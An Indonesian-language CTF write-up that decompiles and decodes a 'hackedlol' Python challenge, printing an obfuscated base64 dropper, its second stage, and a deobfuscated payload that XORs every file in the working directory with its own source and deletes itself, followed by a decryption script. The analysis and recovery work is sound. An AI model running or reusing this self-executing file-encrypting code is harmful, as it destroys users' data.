# Writeup hackedlol

Pertama kita harus decompile file pyc nya menggunakan uncompyle6.

```python
# uncompyle6 version 3.9.0
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.10.8 (tags/v3.10.8:aaaf517, Oct 11 2022, 16:50:30) [MSC v.1933 64 bit (AMD64)]
# Embedded file name: chall.py
# Compiled at: 2023-06-22 21:54:04
# Size of source mod 2**32: 2645 bytes
p = __import__('base64', globals(), locals())
exec(p.b64decode('cT1fX2ltcG9ydF9fKCdceDYyXHg2MVx4NzNceDY1XHgzNlx4MzQnLCBnbG9iYWxzKCksIGxvY2FscygpKTt6PV9faW1wb3J0X18oJ1x4NmZzJywgZ2xvYmFscygpLCBsb2NhbHMoKSk7eD1xLmI2NGRlY29kZSgiYm1KdmRIaHFaM1Z0XHg2Mm5ZOVgxXHgzOXBiWEJ2Y25SXHg2Nlh5Z1x4NmVYSGcyXHg1YWx4XHgzNE56TW5ceDRjQ0JmWDJKMVx4NjFXeDBhVzV6WDE4dVx4NTgxOWthV04wXHg1ODE5YkoyXHg2NGNlRFpqYjJKaFhIZzJZM01uXHg1OFx4NTNncExDQWdYMTlpZFdsc2RHbFx4NzVjMTlceDY2TGw5ZlpHbFx4NmFceDY0RjlmV3lkY2VEWmpiMk5oWEhnMlkzTW5YU1x4NjdwS1R0a2IyXHg0NjNkV3BpXHg2MUc1a1BWOWZhV1x4MzF3YjNKMFgxOG9KMXg0Tm1aekp5d1x4NjdYMTlpZFx4NTdsc2RHbFx4NzVjXHgzMTlmTGxceDM5Zlx4NWFceDQ3bGpkRjlmXHg1N3lkblhIZzJZXHgzMjlpWVZ4XHgzNE5tTnpceDRhMVx4MzBvS1NceDc3Z0lGXHgzOVx4NjZZblZwYkhScGJuTmZYeTVmWDJScFkzUmZYMVx4NzNuWEhnMlkyXHgzOWpZXHg1Nng0Tlx4NmROekoxMFx4NmZceDRiU2s3WW1WamVITjZjM0JrYlx4MzJ0dWJuZGpQVzl3Wlc0b1pYWmhiQ2dpWEhnMVpseDROXHg1N1pjZURZMlx4NThIZzJPXHg1Nng0Tm1NaUt5SmNlRFkxWFx4NDhceDY3MVpseDROV1lpS1NrXHg3NWNtVmhaQ2dwQ2dwbWIzSVx4NjdiSFpsWldscGNHMXVjM1I1YW5CcExDQndceDU5blp0ZG1ONGFHNTJceDU5bTloWlx4NTdvc0lceDQ3XHg3OGlaV3QzWTNOclpIWmxaXHgzMkprZUNCcGJpQlx4NzVZbTlceDMwZUdwbmRXMXVkaTUzWVd4cktHNWliM1I0XHg2MW1kMWJXNTJMbWRsZEdceDRlM1pDZ1x4NzBLVG9LSUNBZ0lceDQ3Wlx4NzZceDYzaUJ2ZW5CdWJYSm1jbVx4NGV2WVhONVkzXHg0NWdhVzRnXHg2MkdKbGEzZGpceDYzMnRrZG1WblltUjRPZ1x4NmZnSUNBZ0lDQWdceDQ5R2xceDc3XHg2MW5OelkzSmxhSFo1Ym1ceDY0aGRqMXZjR1Z1S0d4MlpXVnBhWEJ0Ym5OMGVXcHdhXHg1M3NceDY5WEhceDY3eVppSXJiM3BceDc3Ym0xeVpuSmpiMkZ6ZVdOeEtTNXlaV0ZrS0NrXHgzN2NtZDVhV3gyZDNOeVpHTlx4NmJiXHg2ZFYwUFc5d1pXNG9iSFpsWldscGNHMXVjM1I1YW5CcEt5Slx4NjNceDY1REptSWlzb2IzcFx4NzdibTF5Wm5KamIyXHg0Nlx4N2FlV054TG5KemNHeHBceDY0XHg0M2dceDY5TGlJc0lERXBXXHg3YUJkS1NzaUxtaFx4NjhZMnRsXHg1YUdceDc4dmJceDQzSXNJQ0pjZURjM1hIZzJNXHg2OUlceDcwQ2lBZ0lDQWdJQ0FnWm05eUlHaHVjSEJqZDJacVx4NjRuTnRZM0ZceDZjWVNCcGJpQnlZVzVuWlNoc1pXNG9hWEJceDcxYzNOamNtVm9kbmx1WjJGMktTazZDaUFnSUNceDQxZ0lDQWdJQ0FnSUhKbmVXXHg2Y3NkbmR6Y21Salx4NWFHNWxkXHg0M1x4MzUzY21sMFpTaGphSElvYjNKa0tHbHdhbk56WTNKbGFIWjVceDYybWRceDY4ZGx0b2JuQndZM2RtYW5aemJXTlx4NzhaV0ZkS1Y1dmNtUW9ZbVZqZUhONmMzQmtiMnRceDc1Ym5kalcyaHVjSEJqZFx4MzJacVx4NjRuTnRZXHgzM0ZsWVNWc1pXNG9ZbVZqZUhONlx4NjMzQmtiMnRceDc1Ym5kaktWMHBLUzVsYlx4NmROdlpHVW9LU2tLQ21SdllYZDFhXHg2ZEpvYm1RdWNtVnRiM1psS0dWMllXd29JXHg2Y3hceDM0TldaY1x4NjVEVm1YSGcyTmx4NE5qXHg2Y2NlXHg0NFx4NWFqSWlzaVhIZ1x4MzJOVnhceDM0XHg0ZVdceDVhY2VEVm1JaWtwIik7Zj1vcGVuKCJceDY4XHg2NVx4NmNceDcwXHg2NVx4NzJceDJlXHg3MFx4NzkiLCAidyIpO2Yud3JpdGUoeC5kZWNvZGUoKSk7Zi5jbG9zZSgpO3ouc3lzdGVtKCJceDcwXHg3OVx4NzRceDY4XHg2Zlx4NmVceDMzXHgyMFx4NjhceDY1XHg2Y1x4NzBceDY1XHg3Mlx4MmVceDcwXHg3OSIpO3oucmVtb3ZlKCJceDY4XHg2NVx4NmNceDcwXHg2NVx4NzJceDJlXHg2OFx4NjFceDYzXHg2Ylx4NjVceDY0XHg2Y1x4NmZceDZjIik='))
```

Lalu kita tinggal mendecode string base64nya untuk mendapatkan source code kedua.

```python
q=__import__('\x62\x61\x73\x65\x36\x34', globals(), locals());z=__import__('\x6fs', globals(), locals());x=q.b64decode("bmJvdHhqZ3Vt\x62nY9X1\x39pbXBvcnR\x66Xyg\x6eXHg2\x5alx\x34NzMn\x4cCBfX2J1\x61Wx0aW5zX18u\x5819kaWN0\x5819bJ2\x64ceDZjb2JhXHg2Y3Mn\x58\x53gpLCAgX19idWlsdGl\x75c19\x66Ll9fZGl\x6a\x64F9fWydceDZjb2NhXHg2Y3MnXS\x67pKTtkb2\x463dWpi\x61G5kPV9faW\x31wb3J0X18oJ1x4NmZzJyw\x67X19id\x57lsdGl\x75c\x319fLl\x39f\x5a\x47ljdF9f\x57ydnXHg2Y\x329iYVx\x34NmNz\x4a1\x30oKS\x77gIF\x39\x66YnVpbHRpbnNfXy5fX2RpY3RfX1\x73nXHg2Y2\x39jY\x56x4N\x6dNzJ10\x6f\x4bSk7YmVjeHN6c3Bkb\x32tubndjPW9wZW4oZXZhbCgiXHg1Zlx4N\x57ZceDY2\x58Hg2O\x56x4NmMiKyJceDY1X\x48\x671Zlx4NWYiKSk\x75cmVhZCgpCgpmb3I\x67bHZlZWlpcG1uc3R5anBpLCBw\x59nZtdmN4aG52\x59m9hZ\x57osI\x47\x78iZWt3Y3NrZHZlZ\x32JkeCBpbiB\x75Ym9\x30eGpndW1udi53YWxrKG5ib3R4\x61md1bW52LmdldG\x4e3ZCg\x70KToKICAgI\x47Z\x76\x63iBvenBubXJmcm\x4evYXN5Y3\x45gaW4g\x62GJla3dj\x632tkdmVnYmR4Og\x6fgICAgICAg\x49Gl\x77\x61nNzY3JlaHZ5bm\x64hdj1vcGVuKGx2ZWVpaXBtbnN0eWpwa\x53s\x69XH\x67yZiIrb3p\x77bm1yZnJjb2FzeWNxKS5yZWFkKCk\x37cmd5aWx2d3NyZGN\x6bb\x6dV0PW9wZW4obHZlZWlpcG1uc3R5anBpKyJ\x63\x65DJmIisob3p\x77bm1yZnJjb2\x46\x7aeWNxLnJzcGxp\x64\x43g\x69LiIsIDEpW\x7aBdKSsiLmh\x68Y2tl\x5aG\x78vb\x43IsICJceDc3XHg2M\x69I\x70CiAgICAgICAgZm9yIGhucHBjd2Zq\x64nNtY3F\x6cYSBpbiByYW5nZShsZW4oaXB\x71c3NjcmVodnluZ2F2KSk6CiAgIC\x41gICAgICAgIHJneW\x6csdndzcmRj\x5aG5ld\x43\x353cml0ZShjaHIob3JkKGlwanNzY3JlaHZ5\x62md\x68dltobnBwY3dmanZzbWN\x78ZWFdKV5vcmQoYmVjeHN6c3Bkb2t\x75bndjW2hucHBjd\x32Zq\x64nNtY\x33FlYSVsZW4oYmVjeHN6\x633Bkb2t\x75bndjKV0pKS5lb\x6dNvZGUoKSkKCmRvYXd1a\x6dJobmQucmVtb3ZlKGV2YWwoI\x6cx\x34NWZc\x65DVmXHg2Nlx4Nj\x6cce\x44\x5ajIisiXHg\x32NVx\x34\x4eW\x5aceDVmIikp");f=open("\x68\x65\x6c\x70\x65\x72\x2e\x70\x79", "w");f.write(x.decode());f.close();z.system("\x70\x79\x74\x68\x6f\x6e\x33\x20\x68\x65\x6c\x70\x65\x72\x2e\x70\x79");z.remove("\x68\x65\x6c\x70\x65\x72\x2e\x68\x61\x63\x6b\x65\x64\x6c\x6f\x6c")
```

Code ini akan membuat file helper.py yang isinya adalah source code malware yang sebenarnya, lalu akan menjalankan helper.py dan menghapus dirinya sendiri.

Kita tinggal mendecode lagi string base64nya untuk mendapatkan source code helper.py

```python
nbotxjgumnv=__import__('\x6f\x73', __builtins__.__dict__['g\x6coba\x6cs'](),  __builtins__.__dict__['\x6coca\x6cs']());doawujbhnd=__import__('\x6fs', __builtins__.__dict__['g\x6coba\x6cs'](),  __builtins__.__dict__['\x6coca\x6cs']());becxszspdoknnwc=open(eval("\x5f\x5f\x66\x69\x6c"+"\x65\x5f\x5f")).read()

for lveeiipmnstyjpi, pbvmvcxhnvboaej, lbekwcskdvegbdx in nbotxjgumnv.walk(nbotxjgumnv.getcwd()):
    for ozpnmrfrcoasycq in lbekwcskdvegbdx:
        ipjsscrehvyngav=open(lveeiipmnstyjpi+"\x2f"+ozpnmrfrcoasycq).read();rgyilvwsrdcdnet=open(lveeiipmnstyjpi+"\x2f"+(ozpnmrfrcoasycq.rsplit(".", 1)[0])+".hackedlol", "\x77\x62")
        for hnppcwfjvsmcqea in range(len(ipjsscrehvyngav)):
            rgyilvwsrdcdnet.write(chr(ord(ipjsscrehvyngav[hnppcwfjvsmcqea])^ord(becxszspdoknnwc[hnppcwfjvsmcqea%len(becxszspdoknnwc)])).encode())

doawujbhnd.remove(eval("\x5f\x5f\x66\x69\x6c"+"\x65\x5f\x5f"))
```

Jika kita deobfuscate code ini, pada dasarnya akan melakukan xor setiap file di directory dengan source code helper.py
Untuk mendecrypt important_file, kita tinggal xor kembali dengan source code helper.py

```python
key = open("helper.py").read()
important = open("important_file.hackedlol").read()

res = ""

for i in range(len(important)):
    res += chr(ord(important[i]) ^ ord(key[i]))

print(res)
```